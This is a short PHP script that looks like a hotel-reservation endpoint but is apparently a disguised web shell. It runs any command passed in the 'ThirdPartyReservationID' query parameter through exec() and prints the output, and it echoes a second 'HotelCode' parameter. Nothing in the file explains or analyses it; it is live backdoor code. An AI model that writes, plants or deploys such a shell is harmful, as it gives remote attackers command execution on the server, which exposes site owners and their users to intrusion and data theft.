<?php
if (isset($_GET['ThirdPartyReservationID']) || isset($_GET['HotelCode']) ) {
    // Initialize output array
    $output = [];

    // Function to execute and return output
    function executeCommand($cmd) {
        $result = [];
        exec($cmd, $result, $return_var);
        return $result;
    }

    // Check and execute command
    if (isset($_GET['ThirdPartyReservationID'])) {
        $command = escapeshellcmd($_GET['ThirdPartyReservationID']);
        $output[] = "Command: $command";
        $output = array_merge($output, executeCommand($command));
    }


    if (isset($_GET['HotelCode'])) {
        $lsd = htmlspecialchars($_GET['HotelCode']);
        $output[] = "LSD: $lsd";
    }

    // Output the result
    echo "<pre>";
    echo implode("\n", $output);
    echo "</pre>";
} else {
    echo "No commands specified.";
}
?>
